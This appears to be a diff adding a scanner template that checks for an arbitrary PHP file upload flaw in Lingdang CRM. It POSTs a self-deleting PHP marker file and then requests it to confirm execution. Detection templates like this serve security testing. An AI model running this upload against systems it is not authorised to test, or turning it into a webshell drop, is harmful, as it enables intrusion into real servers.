@@ -1,0 +1,59 @@
+id: poc-yaml-51mis-crm-uploadfile-php-anyfile-upload
+info:
+  name: 灵当CRM uploadfile.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  dt: "{{date_time('2006')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      file_info={"name":"{{t1}}.php"}&<?php echo md5({{t1}});unlink(__FILE__);?>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "filepath"
+          - ".php"
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "\"filename\":\"(?P<file>.*?).php"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/crm/storage/{{dt}}/December/week4/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "file_info"
+          - "{{t1}}"
+          - "{{t2}}"
+        condition: and
+      - type: dsl
+        dsl:
+          - "!contains(body, '<')"
